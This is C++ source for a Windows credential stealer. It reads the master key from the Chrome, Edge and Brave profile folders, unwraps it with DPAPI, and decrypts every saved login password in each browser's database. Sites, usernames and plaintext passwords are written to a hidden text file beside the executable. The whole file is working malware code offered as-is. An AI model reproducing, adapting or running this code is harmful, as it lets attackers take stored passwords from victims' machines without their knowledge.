#pragma once
#include <iostream>
#include <vector>
#include <stdexcept>
#include <memory>
#include <windows.h>
#include <bcrypt.h>
#include <fstream>
#include <Shlobj.h>
#include <vector>
#include <winsqlite/winsqlite3.h>
#pragma comment(lib,"winsqlite3.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")



const size_t IV_SIZE = 12;
const size_t TAG_SIZE = 16;

const int NUMBER_OF_BROWSERS = 3;

enum BROWSER
{
	CHROME, EDGE, BRAVE  // Browsers list, index is important here for the lookup table
};


const std::string LOCAL_STATE_PATHS[NUMBER_OF_BROWSERS] =
{
		"\\Google\\Chrome\\User Data\\Local State",
		"\\Microsoft\\Edge\\User Data\\Local State",
		"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
};


const std::string ACCOUNT_DB_PATHS[NUMBER_OF_BROWSERS] =
{
		"\\Google\\Chrome\\User Data\\Default\\Login Data",
		"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
		"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
};
namespace FileIO
{


	inline std::string GetAppPath()
	{
		CHAR app_data_path[MAX_PATH];
		if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, app_data_path) == S_OK)//get the appdata folder path
		{
			std::string local_state_path(app_data_path);
			return local_state_path;
		}
		return "";
	}


	inline std::string GetDbPath(BROWSER browser) { //get logindata path
		return GetAppPath() + ACCOUNT_DB_PATHS[browser];
	}

	inline std::string GetLocalState(BROWSER browser) //get localstate path to get masterkey
	{
		return GetAppPath() + LOCAL_STATE_PATHS[browser];
	}

	inline std::string ReadFileToString(const std::string& file_path)
	{
		// Open the file
		HANDLE file_handle = CreateFileA(file_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file_handle == INVALID_HANDLE_VALUE)
		{
			// Failed to open the file, return an empty string
			return "";
		}

		// Get the file size
		DWORD file_size = GetFileSize(file_handle, NULL);
		if (file_size == INVALID_FILE_SIZE)
		{
			// Failed to get the file size, close the file handle and return an empty string
			CloseHandle(file_handle);
			return "";
		}

		// Allocate a buffer for the file data
		std::string file_data;
		file_data.resize(file_size);

		// Read the file data into the buffer
		DWORD bytes_read;
		BOOL result = ReadFile(file_handle, &file_data[0], file_size, &bytes_read, NULL);
		CloseHandle(file_handle);
		if (!result || bytes_read != file_size)
		{
			// Failed to read the file data, return an empty string
			return "";
		}

		// Return the file data as a std::string
		return file_data;
	}



}

int count = 0;
int recordNo = 0;

std::unique_ptr<DATA_BLOB> prepareMasterKey()
{
	/*"encrypted_key":"RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAD72vUEZcYSRbgkCVzUPhzyAAAAAAIAAAAAABBmAAAAAQAAIAAAAPhu3rLlefQ
		GpIqkgII7aGsNHwzkm05YveEZkCWnmyXEAAAAAA6AAAAAAgAAIAAAAP0Vqr6iWoDeOmeneZRvIrb / xJemcolfqT9vEEHxzKYXMAAAAMdY2S58DAwbp
		v8f3T7Q8Ak6BzmOeiEHYKiflow3 + fO0rf4WrlDX + BThjsnMdknnX0AAAAD7e / jmiueg2MYUGF0xWm3jKSfvdTjMRiymPU7KZ2D2s4TcoZ9cpj9hGwwi
		E / ZwznwLttfMMEfbIh + KpLhw0Z3g"*/

	//get MasterKEYString FROM CHROME
	std::string MasterString;
	//std::unique_ptr<DATA_BLOB> MasterKey;

	std::string localState = FileIO::GetLocalState(CHROME);// json file contain masterkey
	std::string localStateData = FileIO::ReadFileToString(localState); // read json into a string
	//parse master key
	size_t idx = localStateData.find("encrypted_key") + 16; //+16 for skipping ==>  "encrypted_key":"
	//idx contain index of first character of key inside the json file, for example : 235

	while (idx < localStateData.length() && localStateData[idx] != '\"')//from R to " 
	{
		MasterString.push_back(localStateData[idx]);//appending in masterstring
		idx++;//get next character
	}


	// Base64 decode the key
	std::string base64Key = MasterString;
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;
	std::unique_ptr<DATA_BLOB> outPtr(new DATA_BLOB);
	DATA_BLOB in, out;
	try {
		if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
		{
			std::cout << "[1] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
			return nullptr;
		}

		//binaryKey.data() return address to array to fill it with binaries 
		binaryKey.resize(binaryKeySize);
		if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
		{
			std::cout << "[2] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
			return nullptr;
		}

		// Decrypt the key

		in.pbData = binaryKey.data() + 5; // move pointer after DPAPI
		in.cbData = binaryKeySize - 5; //decreease total size

		if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
		{
			std::cout << "Failed to unprotect master key.\n";
			return nullptr;
		}

		// Allocate memory for the output DATA_BLOB pointer and return it

		outPtr->pbData = out.pbData;
		outPtr->cbData = out.cbData;
		return outPtr;

	}
	catch (...) {
		LocalFree(out.pbData);
		//throw;
	}
}

std::string AESDecrypter(const std::string& EncryptedBlob, const DATA_BLOB& MasterKey)
{
	// Validate input parameters
	if (EncryptedBlob.empty() || MasterKey.cbData == 0 || MasterKey.pbData == nullptr) {
		//throw std::invalid_argument("Invalid input parameters");
		return"";
	}

	// Initialize variables
	BCRYPT_ALG_HANDLE hAlgorithm = nullptr;
	BCRYPT_KEY_HANDLE hKey = nullptr;
	ULONG PlainTextSize = 0;

	std::vector<BYTE> CipherPass(EncryptedBlob.begin(), EncryptedBlob.end());
	std::vector<BYTE> PlainText;

	if (CipherPass.size() <= IV_SIZE + TAG_SIZE) {
		return std::string();
	}

	try {
		// Parse IV and ciphertext from the input buffer
		if (CipherPass.size() < 15 + TAG_SIZE) {
			return "";
			//throw std::runtime_error("Invalid input parameters: EncryptedBlob is too small");
		}
		std::vector<BYTE> IV(CipherPass.begin() + 3, CipherPass.begin() + 3 + IV_SIZE);
		std::vector<BYTE> Ciphertext(CipherPass.begin() + 15, CipherPass.end() - TAG_SIZE);

		// Open algorithm provider for decryption
		NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, nullptr, 0);
		if (!BCRYPT_SUCCESS(status)) {
			return"";
			//throw std::runtime_error("BCryptOpenAlgorithmProvider failed with status: " + status);
		}

		// Set chaining mode for decryption
		status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
		if (!BCRYPT_SUCCESS(status)) {
			return"";
			//throw std::runtime_error("BCryptSetProperty failed with status: " + status);
		}

		// Generate symmetric key
		status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, nullptr, 0, MasterKey.pbData, MasterKey.cbData, 0);
		if (!BCRYPT_SUCCESS(status)) {
			return"";
			//throw std::runtime_error("BCryptGenerateSymmetricKey failed with status: " + status);
		}

		// Authenticate cipher mode information
		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
		AuthInfo.pbNonce = IV.data();
		AuthInfo.cbNonce = IV_SIZE;
		AuthInfo.pbTag = CipherPass.data() + CipherPass.size() - TAG_SIZE;
		AuthInfo.cbTag = TAG_SIZE;

		// Get size of plaintext buffer
		status = BCryptDecrypt(hKey, Ciphertext.data(), static_cast<ULONG>(Ciphertext.size()), &AuthInfo, nullptr, 0, nullptr, 0, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status)) {
			return"";
			//throw std::runtime_error("BCryptDecrypt (1) failed with status: " + status);
		}

		// Allocate memory for the plaintext
		PlainText.resize(PlainTextSize);

		// Decrypt the ciphertext
		status = BCryptDecrypt(hKey, Ciphertext.data(), static_cast<ULONG>(Ciphertext.size()), &AuthInfo, nullptr, 0, PlainText.data(), static_cast<ULONG>(PlainText.size()), &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status)) {
			return"";
			//throw std::runtime_error("BCryptDecrypt (2) failed with status: " + status);
		}

		// Destroy the symmetric key
		BCryptDestroyKey(hKey);
		hKey = nullptr;

		// Close the algorithm handle
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		hAlgorithm = nullptr;

		return std::string(reinterpret_cast<const char*>(PlainText.data()), PlainTextSize);
	}
	catch (const std::exception&) {
		if (hKey) {
			BCryptDestroyKey(hKey);
		}
		if (hAlgorithm) {
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		}
		//throw;
		return"";
	}
}


void DecryptPasswordFor(BROWSER browser)
{


	std::string DbPath = FileIO::GetDbPath(browser); //db file contain credentials

	std::unique_ptr<DATA_BLOB> MasterKey = prepareMasterKey(); // get master_key

	sqlite3* db = nullptr;
	std::string selectQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins";
	sqlite3_stmt* selectStmt = nullptr;


	// Open the database file
	if (sqlite3_open(DbPath.c_str(), &db) != SQLITE_OK) {
		std::cerr << "Failed to open database file: " << sqlite3_errmsg(db) << std::endl;
		return;
	}

	// Prepare the SELECT statement -1 to predict query length automatically
	if (sqlite3_prepare_v2(db, selectQuery.c_str(), -1, &selectStmt, 0) != SQLITE_OK) {
		std::cerr << "Failed to prepare SELECT statement: " << sqlite3_errmsg(db) << std::endl;
		return;
	}

	char buffer[MAX_PATH] = "";
	std::string fileName = "";
	//retrieves the file path of the current running executable and save into buffer
	if (GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0) {
		printf("Cannot get the file path\n");
	}
	else {
		std::cout << buffer << std::endl;
		fileName = buffer; // path to .exe
		std::size_t pos = fileName.rfind(".");
		if (pos == std::string::npos) { //  '.' character was not found in the path to .exe,
			printf("Cannot set the log file name\n");
		}
		else {
			//delete .exe and make it .txt
			fileName.erase(pos + 1);//earse all after the .
			fileName.append("txt"); // add new extension


		}
	}

	// Open the output file stream
	std::ofstream outFile(fileName, std::ios::app | std::ios::binary);
	DWORD attr = GetFileAttributesA(fileName.c_str());
	if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
		SetFileAttributesA(fileName.c_str(), FILE_ATTRIBUTE_HIDDEN);
	}
	// Iterate over the rows of the logins table



	while (sqlite3_step(selectStmt) == SQLITE_ROW) {
		try {
			// Extract the values of the columns
			const char* website = reinterpret_cast<const char*>(sqlite3_column_text(selectStmt, 0));
			const char* loginUrl = reinterpret_cast<const char*>(sqlite3_column_text(selectStmt, 1));
			const char* userName = reinterpret_cast<const char*>(sqlite3_column_text(selectStmt, 2));
			const char* passwordBlob = reinterpret_cast<const char*>(sqlite3_column_blob(selectStmt, 3));
			int passwordBlobSize = sqlite3_column_bytes(selectStmt, 3);

			// Decrypt the password
			if (passwordBlobSize > 0) {
				std::string pass = AESDecrypter(passwordBlob, *MasterKey);
				outFile << "Website: " << website << std::endl;
				outFile << "Login URL: " << loginUrl << std::endl;
				outFile << "User name: " << userName << std::endl;
				outFile << "Password: " << pass << std::endl;
				outFile << "recordNo:: " << recordNo << std::endl;
			}
			else {
				outFile << "No password found for this login" << std::endl;
			}

			// Increment the record number
			recordNo++;
		}
		catch (std::exception& e) {
			sqlite3_finalize(selectStmt);
			sqlite3_close(db);
			std::cerr << "Exception caught: " << e.what() << std::endl;
		}
	}

	// Check for errors
	if (sqlite3_errcode(db) != SQLITE_DONE) {
		std::cerr << "Error occurred while iterating over logins table: " << sqlite3_errmsg(db) << std::endl;
	}

	// Clean up resources
	sqlite3_finalize(selectStmt);
	sqlite3_close(db);

}


